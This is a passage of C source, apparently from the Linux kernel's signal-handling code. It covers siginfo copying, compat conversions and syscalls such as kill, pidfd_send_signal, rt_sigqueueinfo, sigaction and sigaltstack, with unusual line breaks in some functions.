*info,\n                                       const siginfo_t __user\n\n*from)\n{\nif (unlikely(!\nknown_siginfo_layout(info\n->si_signo, info->si_code))) {\nchar __user\n*\nexpansion = si_expansion(from);\nchar buf[SI_EXPANSION_SIZE];\nint i;\n\nif (\ncopy_from_user(&buf, expansion, SI_EXPANSION_SIZE\n))\nreturn -\nEFAULT;\nfor (\ni = 0;\ni<SI_EXPANSION_SIZE;\ni++) {\nif (buf[i] != 0)\nreturn -\nE2BIG;\n}\n}\nreturn 0;\n}\n\nstatic int __copy_siginfo_from_user(int signo, kernel_siginfo_t *to,\n                                    const siginfo_t __user\n\n*from)\n{\nif (\ncopy_from_user(to, from,\nsizeof(struct kernel_siginfo)))\nreturn -\nEFAULT;\nto->\nsi_signo = signo;\nreturn\npost_copy_siginfo_from_user(to, from\n);\n}\n\nint copy_siginfo_from_user(kernel_siginfo_t *to, const siginfo_t __user\n\n*from)\n{\nif (\ncopy_from_user(to, from,\nsizeof(struct kernel_siginfo)))\nreturn -\nEFAULT;\nreturn\npost_copy_siginfo_from_user(to, from\n);\n}\n\n#ifdef CONFIG_COMPAT\n\nvoid copy_siginfo_to_external32(struct compat_siginfo *to,\n    const struct kernel_siginfo *from)\n{\n  memset(to, 0, sizeof(*to));\n\n  to->si_signo = from->si_signo;\n  to->si_errno = from->si_errno;\n  to->si_code = from->si_code;\n  switch(siginfo_layout(from->si_signo, from->si_code)) {\n  case SIL_KILL:\n    to->si_pid = from->si_pid;\n    to->si_uid = from->si_uid;\n    break;\n  case SIL_TIMER:\n    to->si_tid = from->si_tid;\n    to->si_overrun = from->si_overrun;\n    to->si_int = from->si_int;\n    break;\n  case SIL_POLL:\n    to->si_band = from->si_band;\n    to->si_fd = from->si_fd;\n    break;\n  case SIL_FAULT:\n    to->si_addr = ptr_to_compat(from->si_addr);\n    break;\n  case SIL_FAULT_TRAPNO:\n    to->si_addr = ptr_to_compat(from->si_addr);\n    to->si_trapno = from->si_trapno;\n    break;\n  case SIL_FAULT_MCEERR:\n    to->si_addr = ptr_to_compat(from->si_addr);\n    to->si_addr_lsb = from->si_addr_lsb;\n    break;\n  case SIL_FAULT_BNDERR:\n    to->si_addr = ptr_to_compat(from->si_addr);\n    to->si_lower = ptr_to_compat(from->si_lower);\n    to->si_upper = ptr_to_compat(from->si_upper);\n    break;\n  case SIL_FAULT_PKUERR:\n    to->si_addr = ptr_to_compat(from->si_addr);\n    to->si_pkey = from->si_pkey;\n    break;\n  case SIL_FAULT_PERF_EVENT:\n    to->si_addr = ptr_to_compat(from->si_addr);\n    to->si_perf_data = from->si_perf_data;\n    to->si_perf_type = from->si_perf_type;\n    break;\n  case SIL_CHLD:\n    to->si_pid = from->si_pid;\n    to->si_uid = from->si_uid;\n    to->si_status = from->si_status;\n    to->si_utime = from->si_utime;\n    to->si_stime = from->si_stime;\n    break;\n  case SIL_RT:\n    to->si_pid = from->si_pid;\n    to->si_uid = from->si_uid;\n    to->si_int = from->si_int;\n    break;\n  case SIL_SYS:\n    to->si_call_addr = ptr_to_compat(from->si_call_addr);\n    to->si_syscall = from->si_syscall;\n    to->si_arch = from->si_arch;\n    break;\n  }\n}\n\nint __copy_siginfo_to_user32(struct compat_siginfo __user *to,\n         const struct kernel_siginfo *from)\n{\n  struct compat_siginfo new;\n\n  copy_siginfo_to_external32(&new, from);\n  if (copy_to_user(to, &new, sizeof(struct compat_siginfo)))\n    return -EFAULT;\n  return 0;\n}\n\nstatic int post_copy_siginfo_from_user32(kernel_siginfo_t *to,\n           const struct compat_siginfo *from)\n{\n  clear_siginfo(to);\n  to->si_signo = from->si_signo;\n  to->si_errno = from->si_errno;\n  to->si_code = from->si_code;\n  switch(siginfo_layout(from->si_signo, from->si_code)) {\n  case SIL_KILL:\n    to->si_pid = from->si_pid;\n    to->si_uid = from->si_uid;\n    break;\n  case SIL_TIMER:\n    to->si_tid = from->si_tid;\n    to->si_overrun = from->si_overrun;\n    to->si_int = from->si_int;\n    break;\n  case SIL_POLL:\n    to->si_band = from->si_band;\n    to->si_fd = from->si_fd;\n    break;\n  case SIL_FAULT:\n    to->si_addr = compat_ptr(from->si_addr);\n    break;\n  case SIL_FAULT_TRAPNO:\n    to->si_addr = compat_ptr(from->si_addr);\n    to->si_trapno = from->si_trapno;\n    break;\n  case SIL_FAULT_MCEERR:\n    to->si_addr = compat_ptr(from->si_addr);\n    to->si_addr_lsb = from->si_addr_lsb;\n    break;\n  case SIL_FAULT_BNDERR:\n    to->si_addr = compat_ptr(from->si_addr);\n    to->si_lower = compat_ptr(from->si_lower);\n    to->si_upper = compat_ptr(from->si_upper);\n    break;\n  case SIL_FAULT_PKUERR:\n    to->si_addr = compat_ptr(from->si_addr);\n    to->si_pkey = from->si_pkey;\n    break;\n  case SIL_FAULT_PERF_EVENT:\n    to->si_addr = compat_ptr(from->si_addr);\n    to->si_perf_data = from->si_perf_data;\n    to->si_perf_type = from->si_perf_type;\n    break;\n  case SIL_CHLD:\n    to->si_pid = from->si_pid;\n    to->si_uid = from->si_uid;\n    to->si_status = from->si_status;\n#ifdef CONFIG_X86_X32_ABI\n    if (in_x32_syscall()) {\n      to->si_utime = from->_sifields._sigchld_x32._utime;\n      to->si_stime = from->_sifields._sigchld_x32._stime;\n    } else\n#endif\n    {\n      to->si_utime = from->si_utime;\n      to->si_stime = from->si_stime;\n    }\n    break;\n  case SIL_RT:\n    to->si_pid = from->si_pid;\n    to->si_uid = from->si_uid;\n    to->si_int = from->si_int;\n    break;\n  case SIL_SYS:\n    to->si_call_addr = compat_ptr(from->si_call_addr);\n    to->si_syscall = from->si_syscall;\n    to->si_arch = from->si_arch;\n    break;\n  }\n  return 0;\n}\n\nstatic int __copy_siginfo_from_user32(int signo, struct kernel_siginfo *to,\n              const struct compat_siginfo __user *ufrom)\n{\n  struct compat_siginfo from;\n\n  if (copy_from_user(&from, ufrom, sizeof(struct compat_siginfo)))\n    return -EFAULT;\n\n  from.si_signo = signo;\n  return post_copy_siginfo_from_user32(to, &from);\n}\n\nint copy_siginfo_from_user32(struct kernel_siginfo *to,\n           const struct compat_siginfo __user *ufrom)\n{\n  struct compat_siginfo from;\n\n  if (copy_from_user(&from, ufrom, sizeof(struct compat_siginfo)))\n    return -EFAULT;\n\n  return post_copy_siginfo_from_user32(to, &from);\n}\n#endif\n\nstatic int do_sigtimedwait(const sigset_t *which, kernel_siginfo_t *info,\n                           const struct timespec64 *ts) {\n  ktime_t *to = NULL, timeout = KTIME_MAX;\n  struct task_struct *tsk = current;\n  sigset_t mask = *which;\n  enum pid_type type;\n  int sig, ret = 0;\n\n  if (ts) {\n    if (!timespec64_valid(ts))\n      return -EINVAL;\n    timeout = timespec64_to_ktime(*ts);\n    to = &timeout;\n  }\n\n  sigdelsetmask(&mask, sigmask(SIGKILL) | sigmask(SIGSTOP));\n  signotset(&mask);\n\n  spin_lock_irq(&tsk->sighand->siglock);\n  sig = dequeue_signal(tsk, &mask, info, &type);\n  if (!sig && timeout) {\n\n    tsk->real_blocked = tsk->blocked;\n    sigandsets(&tsk->blocked, &tsk->blocked, &mask);\n    recalc_sigpending();\n    spin_unlock_irq(&tsk->sighand->siglock);\n\n    __set_current_state(TASK_INTERRUPTIBLE);\n    ret = freezable_schedule_hrtimeout_range(to, tsk->timer_slack_ns,\n                                             HRTIMER_MODE_REL);\n    spin_lock_irq(&tsk->sighand->siglock);\n    __set_task_blocked(tsk, &tsk->real_blocked);\n    sigemptyset(&tsk->real_blocked);\n    sig = dequeue_signal(tsk, &mask, info, &type);\n  }\n  spin_unlock_irq(&tsk->sighand->siglock);\n\n  if (sig)\n    return sig;\n  return ret ? -EINTR : -EAGAIN;\n}\n\nSYSCALL_DEFINE4(rt_sigtimedwait,\nconst sigset_t __user\n*, uthese,\nsiginfo_t __user\n*, uinfo,\nconst struct __kernel_timespec __user\n*, uts,\nsize_t, sigsetsize)\n{\nsigset_t these;\nstruct timespec64 ts;\nkernel_siginfo_t info;\nint ret;\n\nif (sigsetsize != sizeof(sigset_t))\nreturn -\nEINVAL;\n\nif (\ncopy_from_user(&these, uthese,\nsizeof(these)))\nreturn -\nEFAULT;\n\nif (uts) {\nif (\nget_timespec64(&ts, uts\n))\nreturn -\nEFAULT;\n}\n\nret = do_sigtimedwait(&these, &info, uts ? &ts : NULL);\n\nif (ret > 0 && uinfo) {\nif (\ncopy_siginfo_to_user(uinfo, &info\n))\nret = -EFAULT;\n}\n\nreturn\nret;\n}\n\n#ifdef CONFIG_COMPAT_32BIT_TIME\nSYSCALL_DEFINE4(rt_sigtimedwait_time32, const sigset_t __user *, uthese,\n    siginfo_t __user *, uinfo,\n    const struct old_timespec32 __user *, uts,\n    size_t, sigsetsize)\n{\n  sigset_t these;\n  struct timespec64 ts;\n  kernel_siginfo_t info;\n  int ret;\n\n  if (sigsetsize != sizeof(sigset_t))\n    return -EINVAL;\n\n  if (copy_from_user(&these, uthese, sizeof(these)))\n    return -EFAULT;\n\n  if (uts) {\n    if (get_old_timespec32(&ts, uts))\n      return -EFAULT;\n  }\n\n  ret = do_sigtimedwait(&these, &info, uts ? &ts : NULL);\n\n  if (ret > 0 && uinfo) {\n    if (copy_siginfo_to_user(uinfo, &info))\n      ret = -EFAULT;\n  }\n\n  return ret;\n}\n#endif\n\n#ifdef CONFIG_COMPAT\nCOMPAT_SYSCALL_DEFINE4(rt_sigtimedwait_time64, compat_sigset_t __user *, uthese,\n    struct compat_siginfo __user *, uinfo,\n    struct __kernel_timespec __user *, uts, compat_size_t, sigsetsize)\n{\n  sigset_t s;\n  struct timespec64 t;\n  kernel_siginfo_t info;\n  long ret;\n\n  if (sigsetsize != sizeof(sigset_t))\n    return -EINVAL;\n\n  if (get_compat_sigset(&s, uthese))\n    return -EFAULT;\n\n  if (uts) {\n    if (get_timespec64(&t, uts))\n      return -EFAULT;\n  }\n\n  ret = do_sigtimedwait(&s, &info, uts ? &t : NULL);\n\n  if (ret > 0 && uinfo) {\n    if (copy_siginfo_to_user32(uinfo, &info))\n      ret = -EFAULT;\n  }\n\n  return ret;\n}\n\n#ifdef CONFIG_COMPAT_32BIT_TIME\nCOMPAT_SYSCALL_DEFINE4(rt_sigtimedwait_time32, compat_sigset_t __user *, uthese,\n    struct compat_siginfo __user *, uinfo,\n    struct old_timespec32 __user *, uts, compat_size_t, sigsetsize)\n{\n  sigset_t s;\n  struct timespec64 t;\n  kernel_siginfo_t info;\n  long ret;\n\n  if (sigsetsize != sizeof(sigset_t))\n    return -EINVAL;\n\n  if (get_compat_sigset(&s, uthese))\n    return -EFAULT;\n\n  if (uts) {\n    if (get_old_timespec32(&t, uts))\n      return -EFAULT;\n  }\n\n  ret = do_sigtimedwait(&s, &info, uts ? &t : NULL);\n\n  if (ret > 0 && uinfo) {\n    if (copy_siginfo_to_user32(uinfo, &info))\n      ret = -EFAULT;\n  }\n\n  return ret;\n}\n#endif\n#endif\n\nstatic inline void prepare_kill_siginfo(int sig, struct kernel_siginfo *info) {\n  clear_siginfo(info);\n  info->si_signo = sig;\n  info->si_errno = 0;\n  info->si_code = SI_USER;\n  info->si_pid = task_tgid_vnr(current);\n  info->si_uid = from_kuid_munged(current_user_ns(), current_uid());\n}\n\nSYSCALL_DEFINE2(kill, pid_t, pid,\nint, sig)\n{\nstruct kernel_siginfo info;\n\nprepare_kill_siginfo(sig, &info\n);\n\nreturn\nkill_something_info(sig, &info, pid\n);\n}\n\nstatic bool access_pidfd_pidns(struct pid *pid) {\n  struct pid_namespace *active = task_active_pid_ns(current);\n  struct pid_namespace *p = ns_of_pid(pid);\n\n  for (;;) {\n    if (!p)\n      return false;\n    if (p == active)\n      break;\n    p = p->parent;\n  }\n\n  return true;\n}\n\nstatic int copy_siginfo_from_user_any(kernel_siginfo_t *kinfo,\n                                      siginfo_t __user\n\n*info)\n{\n#ifdef CONFIG_COMPAT\n\n\n\n\n\nif (in_compat_syscall())\n  return copy_siginfo_from_user32(\n    kinfo, (struct compat_siginfo __user *)info);\n#endif\nreturn\ncopy_siginfo_from_user(kinfo, info\n);\n}\n\nstatic struct pid *pidfd_to_pid(const struct file *file) {\n  struct pid *pid;\n\n  pid = pidfd_pid(file);\n  if (!IS_ERR(pid))\n    return pid;\n\n  return tgid_pidfd_to_pid(file);\n}\n\nSYSCALL_DEFINE4(pidfd_send_signal,\nint, pidfd, int, sig,\nsiginfo_t __user\n*, info, unsigned int, flags)\n{\nint ret;\nstruct fd f;\nstruct pid *pid;\nkernel_siginfo_t kinfo;\n\nif (flags)\nreturn -\nEINVAL;\n\nf = fdget(pidfd);\nif (!f.file)\nreturn -\nEBADF;\n\npid = pidfd_to_pid(f.file);\nif (\nIS_ERR(pid)\n) {\nret = PTR_ERR(pid);\ngoto\nerr;\n}\n\nret = -EINVAL;\nif (!\naccess_pidfd_pidns(pid)\n)\ngoto\nerr;\n\nif (info) {\nret = copy_siginfo_from_user_any(&kinfo, info);\nif (\nunlikely(ret)\n)\ngoto\nerr;\n\nret = -EINVAL;\nif (\nunlikely(sig\n!= kinfo.si_signo))\ngoto\nerr;\n\nret = -EPERM;\nif ((\ntask_pid(current)\n!= pid) &&\n(kinfo.si_code >= 0 || kinfo.si_code == SI_TKILL))\ngoto\nerr;\n} else {\nprepare_kill_siginfo(sig, &kinfo\n);\n}\n\nret = kill_pid_info(sig, &kinfo, pid);\n\nerr:\nfdput(f);\nreturn\nret;\n}\n\nstatic int\n    do_send_specific(pid_t\ntgid,\npid_t pid,\nint sig,\nstruct kernel_siginfo *info\n)\n{\nstruct task_struct *p;\nint error = -ESRCH;\n\nrcu_read_lock();\n\np = find_task_by_vpid(pid);\nif (\np &&(tgid\n<= 0 ||\ntask_tgid_vnr(p)\n== tgid)) {\nerror = check_kill_permission(sig, info, p);\n\nif (!\nerror &&sig\n) {\nerror = do_send_sig_info(sig, info, p, PIDTYPE_PID);\n\nif (\nunlikely(error\n== -ESRCH))\nerror = 0;\n}\n}\n\nrcu_read_unlock();\n\nreturn\nerror;\n}\n\nstatic int do_tkill(pid_t\ntgid,\npid_t pid,\nint sig\n)\n{\nstruct kernel_siginfo info;\n\nclear_siginfo(&info);\ninfo.\nsi_signo = sig;\ninfo.\nsi_errno = 0;\ninfo.\nsi_code = SI_TKILL;\ninfo.\nsi_pid = task_tgid_vnr(current);\ninfo.\nsi_uid = from_kuid_munged(current_user_ns(), current_uid());\n\nreturn\ndo_send_specific(tgid, pid, sig, &info\n);\n}\nSYSCALL_DEFINE3(tgkill, pid_t, tgid, pid_t, pid,\nint, sig)\n{\n\nif (pid <= 0 || tgid <= 0)\nreturn -\nEINVAL;\n\nreturn\ndo_tkill(tgid, pid, sig\n);\n}\nSYSCALL_DEFINE2(tkill, pid_t, pid,\nint, sig)\n{\n\nif (pid <= 0)\nreturn -\nEINVAL;\n\nreturn do_tkill(0, pid, sig);\n}\n\nstatic int do_rt_sigqueueinfo(pid_t\npid,\nint sig, kernel_siginfo_t\n*info)\n{\n\nif ((info->si_code >= 0 || info->si_code == SI_TKILL) &&\n(\ntask_pid_vnr(current)\n!= pid))\nreturn -\nEPERM;\n\nreturn\nkill_proc_info(sig, info, pid\n);\n}\n\nSYSCALL_DEFINE3(rt_sigqueueinfo, pid_t, pid,\nint, sig,\nsiginfo_t __user\n*, uinfo)\n{\nkernel_siginfo_t info;\nint ret = __copy_siginfo_from_user(sig, &info, uinfo);\nif (\nunlikely(ret)\n)\nreturn\nret;\nreturn\ndo_rt_sigqueueinfo(pid, sig, &info\n);\n}\n\n#ifdef CONFIG_COMPAT\nCOMPAT_SYSCALL_DEFINE3(rt_sigqueueinfo,\n      compat_pid_t, pid,\n      int, sig,\n      struct compat_siginfo __user *, uinfo)\n{\n  kernel_siginfo_t info;\n  int ret = __copy_siginfo_from_user32(sig, &info, uinfo);\n  if (unlikely(ret))\n    return ret;\n  return do_rt_sigqueueinfo(pid, sig, &info);\n}\n#endif\n\nstatic int do_rt_tgsigqueueinfo(pid_t\ntgid,\npid_t pid,\nint sig, kernel_siginfo_t\n*info)\n{\n\nif (pid <= 0 || tgid <= 0)\nreturn -\nEINVAL;\n\nif ((info->si_code >= 0 || info->si_code == SI_TKILL) &&\n(\ntask_pid_vnr(current)\n!= pid))\nreturn -\nEPERM;\n\nreturn\ndo_send_specific(tgid, pid, sig, info\n);\n}\n\nSYSCALL_DEFINE4(rt_tgsigqueueinfo, pid_t, tgid, pid_t, pid,\nint, sig,\nsiginfo_t __user\n*, uinfo)\n{\nkernel_siginfo_t info;\nint ret = __copy_siginfo_from_user(sig, &info, uinfo);\nif (\nunlikely(ret)\n)\nreturn\nret;\nreturn\ndo_rt_tgsigqueueinfo(tgid, pid, sig, &info\n);\n}\n\n#ifdef CONFIG_COMPAT\nCOMPAT_SYSCALL_DEFINE4(rt_tgsigqueueinfo,\n      compat_pid_t, tgid,\n      compat_pid_t, pid,\n      int, sig,\n      struct compat_siginfo __user *, uinfo)\n{\n  kernel_siginfo_t info;\n  int ret = __copy_siginfo_from_user32(sig, &info, uinfo);\n  if (unlikely(ret))\n    return ret;\n  return do_rt_tgsigqueueinfo(tgid, pid, sig, &info);\n}\n#endif\n\nvoid kernel_sigaction(int sig, __sighandler_t action) {\n  spin_lock_irq(&current->sighand->siglock);\n  current->sighand->action[sig - 1].sa.sa_handler = action;\n  if (action == SIG_IGN) {\n    sigset_t mask;\n\n    sigemptyset(&mask);\n    sigaddset(&mask, sig);\n\n    flush_sigqueue_mask(&mask, &current->signal->shared_pending);\n    flush_sigqueue_mask(&mask, &current->pending);\n    recalc_sigpending();\n  }\n  spin_unlock_irq(&current->sighand->siglock);\n}\n\nEXPORT_SYMBOL(kernel_sigaction);\n\nvoid __weak\n\nsigaction_compat_abi(struct k_sigaction *act,\n                     struct k_sigaction *oact) {\n}\n\nint do_sigaction(int sig, struct k_sigaction *act, struct k_sigaction *oact) {\n  struct task_struct *p = current, *t;\n  struct k_sigaction *k;\n  sigset_t mask;\n\n  if (!valid_signal(sig) || sig < 1 || (act && sig_kernel_only(sig)))\n    return -EINVAL;\n\n  k = &p->sighand->action[sig - 1];\n\n  spin_lock_irq(&p->sighand->siglock);\n  if (k->sa.sa_flags & SA_IMMUTABLE) {\n    spin_unlock_irq(&p->sighand->siglock);\n    return -EINVAL;\n  }\n  if (oact)\n    *oact = *k;\n\n  BUILD_BUG_ON(UAPI_SA_FLAGS & SA_UNSUPPORTED);\n\n  if (act)\n    act->sa.sa_flags &= UAPI_SA_FLAGS;\n  if (oact)\n    oact->sa.sa_flags &= UAPI_SA_FLAGS;\n\n  sigaction_compat_abi(act, oact);\n\n  if (act) {\n    sigdelsetmask(&act->sa.sa_mask,\n                  sigmask(SIGKILL) | sigmask(SIGSTOP));\n    *k = *act;\n    if (sig_handler_ignored(sig_handler(p, sig), sig)) {\n      sigemptyset(&mask);\n      sigaddset(&mask, sig);\n      flush_sigqueue_mask(&mask, &p->signal->shared_pending);\n      for_each_thread(p, t)\n      flush_sigqueue_mask(&mask, &t->pending);\n    }\n  }\n\n  spin_unlock_irq(&p->sighand->siglock);\n  return 0;\n}\n\n#ifdef CONFIG_DYNAMIC_SIGFRAME\nstatic inline void sigaltstack_lock(void)\n  __acquires(&current->sighand->siglock)\n{\n  spin_lock_irq(&current->sighand->siglock);\n}\n\nstatic inline void sigaltstack_unlock(void)\n  __releases(&current->sighand->siglock)\n{\n  spin_unlock_irq(&current->sighand->siglock);\n}\n#else\n\nstatic inline void sigaltstack_lock(void) {}\n\nstatic inline void sigaltstack_unlock(void) {}\n\n#endif\n\nstatic int\ndo_sigaltstack(const stack_t *ss, stack_t *oss, unsigned long sp,\n               size_t min_ss_size) {\n  struct task_struct *t = current;\n  int ret = 0;\n\n  if (oss) {\n    memset(oss, 0, sizeof(stack_t));\n    oss->ss_sp = (void\n    __user *) t->sas_ss_sp;\n    oss->ss_size = t->sas_ss_size;\n    oss->ss_flags = sas_ss_flags(sp) |\n                    (current->sas_ss_flags & SS_FLAG_BITS);\n  }\n\n  if (ss) {\n    void __user\n    *ss_sp = ss->ss_sp;\n    size_t ss_size = ss->ss_size;\n    unsigned ss_flags = ss->ss_flags;\n    int ss_mode;\n\n    if (unlikely(on_sig_stack(sp)))\n      return -EPERM;\n\n    ss_mode = ss_flags & ~SS_FLAG_BITS;\n    if (unlikely(ss_mode != SS_DISABLE && ss_mode != SS_ONSTACK &&\n                 ss_mode != 0))\n      return -EINVAL;\n\n    if (t->sas_ss_sp == (unsigned long) ss_sp &&\n        t->sas_ss_size == ss_size &&\n        t->sas_ss_flags == ss_flags)\n      return 0;\n\n    sigaltstack_lock();\n    if (ss_mode == SS_DISABLE) {\n      ss_size = 0;\n      ss_sp = NULL;\n    } else {\n      if (unlikely(ss_size < min_ss_size))\n        ret = -ENOMEM;\n      if (!sigaltstack_size_valid(ss_size))\n        ret = -ENOMEM;\n    }\n    if (!ret) {\n      t->sas_ss_sp = (unsigned long) ss_sp;\n      t->sas_ss_size = ss_size;\n      t->sas_ss_flags = ss_flags;\n    }\n    sigaltstack_unlock();\n  }\n  return ret;\n}\n\nSYSCALL_DEFINE2(sigaltstack,\nconst stack_t __user\n*,uss,\nstack_t __user\n*,uoss)\n{\nstack_t new,\nold;\nint err;\nif (\nuss &&copy_from_user(&new, uss, sizeof(stack_t))\n)\nreturn -\nEFAULT;\nerr = do_sigaltstack(uss ? &new : NULL, uoss ? &old : NULL,\n                     current_user_stack_pointer(),\n                     MINSIGSTKSZ);\nif (!\nerr &&uoss\n&&\ncopy_to_user(uoss, &old,\nsizeof(stack_t)))\nerr = -EFAULT;\nreturn\nerr;\n}\n\nint restore_altstack(const stack_t __user\n\n*uss)\n{\nstack_t new;\nif (copy_from_user(&new, uss, sizeof(stack_t)))\nreturn -\nEFAULT;\n(void)do_sigaltstack(&new, NULL,\n\ncurrent_user_stack_pointer(),\n    MINSIGSTKSZ\n\n);\n\nreturn 0;\n}\n\nint __save_altstack(stack_t __user\n\n*uss,\nunsigned long sp\n)\n{\nstruct task_struct *t = current;\nint err = __put_user((void\n__user *)t->sas_ss_sp, &uss->ss_sp) |\n__put_user(t\n->sas_ss_flags, &uss->ss_flags) |\n__put_user(t\n->sas_ss_size, &uss->ss_size);\nreturn\nerr;\n}\n\n#ifdef CONFIG_COMPAT\nstatic int do_compat_sigaltstack(const compat_stack_t __user *uss_ptr,\n         compat_stack_t __user *uoss_ptr)\n{\n  stack_t uss, uoss;\n  int ret;\n\n  if (uss_ptr) {\n    compat_stack_t uss32;\n    if (copy_from_user(&uss32, uss_ptr, sizeof(compat_stack_t)))\n      return -EFAULT;\n    uss.ss_sp = compat_ptr(uss32.ss_sp);\n    uss.ss_flags = uss32.ss_flags;\n    uss.ss_size = uss32.ss_size;\n  }\n  ret = do_sigaltstack(uss_ptr ? &uss : NULL, &uoss,\n           compat_user_stack_pointer(),\n           COMPAT_MINSIGSTKSZ);\n  if (ret >= 0 && uoss_ptr) {\n    compat_stack_t old;\n    memset(&old, 0, sizeof(old));\n    old.ss_sp = ptr_to_compat(uoss.ss_sp);\n    old.ss_flags = uoss.ss_flags;\n    old.ss_size = uoss.ss_size;\n    if (copy_to_user(uoss_ptr, &old, sizeof(compat_stack_t)))\n      ret = -EFAULT;\n  }\n  return ret;\n}\n\nCOMPAT_SYSCALL_DEFINE2(sigaltstack,\n      const compat_stack_t __user *, uss_ptr,\n      compat_stack_t __user *, uoss_ptr)\n{\n  return do_compat_sigaltstack(uss_ptr, uoss_ptr);\n}\n\nint compat_restore_altstack(const compat_stack_t __user *uss)\n{\n  int err = do_compat_sigaltstack(uss, NULL);\n\n  return err == -EFAULT ? err : 0;\n}\n\nint __compat_save_altstack(compat_stack_t __user *uss, unsigned long sp)\n{\n  int err;\n  struct task_struct *t = current;\n  err = __put_user(ptr_to_compat((void __user *)t->sas_ss_sp),\n       &uss->ss_sp) |\n    __put_user(t->sas_ss_flags, &uss->ss_flags) |\n    __put_user(t->sas_ss_size, &uss->ss_size);\n  return err;\n}\n#endif\n\n#ifdef __ARCH_WANT_SYS_SIGPENDING\n\n\n\n\n\nSYSCALL_DEFINE1(sigpending, old_sigset_t __user *, uset)\n{\n  sigset_t set;\n\n  if (sizeof(old_sigset_t) > sizeof(*uset))\n    return -EINVAL;\n\n  do_sigpending(&set);\n\n  if (copy_to_user(uset, &set, sizeof(old_sigset_t)))\n    return -EFAULT;\n\n  return 0;\n}\n\n#ifdef CONFIG_COMPAT\nCOMPAT_SYSCALL_DEFINE1(sigpending, compat_old_sigset_t __user *, set32)\n{\n  sigset_t set;\n\n  do_sigpending(&set);\n\n  return put_user(set.sig[0], set32);\n}\n#endif\n\n#endif\n\n#ifdef __ARCH_WANT_SYS_SIGPROCMASK\n\nSYSCALL_DEFINE3(sigprocmask, int, how, old_sigset_t __user *, nset,\n    old_sigset_t __user *, oset)\n{\n  old_sigset_t old_set, new_set;\n  sigset_t new_blocked;\n\n  old_set = current->blocked.sig[0];\n\n  if (nset) {\n    if (copy_from_user(&new_set, nset, sizeof(*nset)))\n      return -EFAULT;\n\n    new_blocked = current->blocked;\n\n    switch (how) {\n    case SIG_BLOCK:\n      sigaddsetmask(&new_blocked, new_set);\n      break;\n    case SIG_UNBLOCK:\n      sigdelsetmask(&new_blocked, new_set);\n      break;\n    case SIG_SETMASK:\n      new_blocked.sig[0] = new_set;\n      break;\n    default:\n      return -EINVAL;\n    }\n\n    set_current_blocked(&new_blocked);\n  }\n\n  if (oset) {\n    if (copy_to_user(oset, &old_set, sizeof(*oset)))\n      return -EFAULT;\n  }\n\n  return 0;\n}\n#endif\n\n#ifndef CONFIG_ODD_RT_SIGACTION\n\nSYSCALL_DEFINE4(rt_sigaction,\nint, sig,\nconst struct sigaction __user\n*, act,\nstruct sigaction __user\n*, oact,\nsize_t, sigsetsize)\n{\nstruct k_sigaction new_sa, old_sa;\nint ret;\n\nif (sigsetsize != sizeof(sigset_t))\nreturn -\nEINVAL;\n\nif (\nact &&copy_from_user(&new_sa.sa, act, sizeof(new_sa.sa))\n)\nreturn -\nEFAULT;\n\nret = do_sigaction(sig, act ? &new_sa : NULL, oact ? &old_sa : NULL);\nif (ret)\nreturn\nret;\n\nif (\noact &&copy_to_user(oact, &old_sa.sa, sizeof(old_sa.sa))\n)\nreturn -\nEFAULT;\n\nreturn 0;\n}\n#ifdef CONFIG_COMPAT\nCOMPAT_SYSCALL_DEFINE4(rt_sigaction, int, sig,\n    const struct compat_sigaction __user *, act,\n    struct compat_sigaction __user *, oact,\n    compat_size_t, sigsetsize)\n{\n  struct k_sigaction new_ka, old_ka;\n#ifdef __ARCH_HAS_SA_RESTORER\n  compat_uptr_t restorer;\n#endif\n  int ret;\n\n\n  if (sigsetsize != sizeof(compat_sigset_t))\n    return -EINVAL;\n\n  if (act) {\n    compat_uptr_t handler;\n    ret = get_user(handler, &act->sa_handler);\n    new_ka.sa.sa_handler = compat_ptr(handler);\n#ifdef __ARCH_HAS_SA_RESTORER\n    ret |= get_user(restorer, &act->sa_restorer);\n    new_ka.sa.sa_restorer = compat_ptr(restorer);\n#endif\n    ret |= get_compat_sigset(&new_ka.sa.sa_mask, &act->sa_mask);\n    ret |= get_user(new_ka.sa.sa_flags, &act->sa_flags);\n    if (ret)\n      return -EFAULT;\n  }\n\n  ret = do_sigaction(sig, act ? &new_ka : NULL, oact ? &old_ka : NULL);\n  if (!ret && oact) {\n    ret = put_user(ptr_to_compat(old_ka.sa.sa_handler),\n             &oact->sa_handler);\n    ret |= put_compat_sigset(&oact->sa_mask, &old_ka.sa.sa_mask,\n           sizeof(oact->sa_mask));\n    ret |= put_user(old_ka.sa.sa_flags, &oact->sa_flags);\n#ifdef __ARCH_HAS_SA_RESTORER\n    ret |= put_user(ptr_to_compat(old_ka.sa.sa_restorer),\n        &oact->sa_restorer);\n#endif\n  }\n  return ret;\n}\n#endif\n#endif\n\n#ifdef CONFIG_OLD_SIGACTION\nSYSCALL_DEFINE3(sigaction, int, sig,\n    const struct old_sigaction __user *, act,\n          struct old_sigaction __user *, oact)\n{\n  struct k_sigaction new_ka, old_ka;\n  int ret;\n\n  if (act) {\n    old_sigset_t mask;\n    if (!access_ok(act, sizeof(*act)) ||\n        __get_user(new_ka.sa.sa_handler, &act->sa_handler) ||\n        __get_user(new_ka.sa.sa_restorer, &act->sa_restorer) ||\n        __get_user(new_ka.sa.sa_flags, &act->sa_flags) ||\n        __get_user(mask, &act->sa_mask))\n      return -EFAULT;\n#ifdef __ARCH_HAS_KA_RESTORER\n    new_ka.ka_restorer = NULL;\n#endif\n    siginitset(&new_ka.sa.sa_mask, mask);\n  }\n\n  ret = do_sigaction(sig, act ? &new_ka : NULL, oact ? &old_ka : NULL);\n\n  if (!ret && oact) {\n    if (!access_ok(oact, sizeof(*oact)) ||\n        __put_user(old_ka.sa.sa_handler, &oact->sa_handler) ||\n        __put_user(old_ka.sa.sa_restorer, &oact->sa_restorer) ||\n        __put_user(old_ka.sa.sa_flags, &oact->sa_flags) ||\n        __put_user(old_ka.sa.sa_mask.sig[0], &oact->sa_mask))\n      return -EFAULT;\n  }\n\n  return ret;\n}\n#endif\n#ifdef CONFIG_COMPAT_OLD_SIGACTION\nCOMPAT_SYSCALL_DEFINE3(sigaction, int, sig,\n    const struct compat_old_sigaction __user *, act,\n          struct compat_old_sigaction __user *, oact)\n{\n  struct k_sigaction new_ka, old_ka;\n  int ret;\n  compat_old_sigset_t mask;\n  compat_uptr_t handler, restorer;\n\n  if (act) {\n    if (!access_ok(act, sizeof(*act)) ||\n        __get_user(handler, &act->sa_handler) ||\n        __get_user(restorer, &act->sa_restorer) ||\n        __get_user(new_ka.sa.sa_flags, &act->sa_flags) ||\n        __get_user(mask, &act->sa_mask))\n      return -EFAULT;\n\n#ifdef 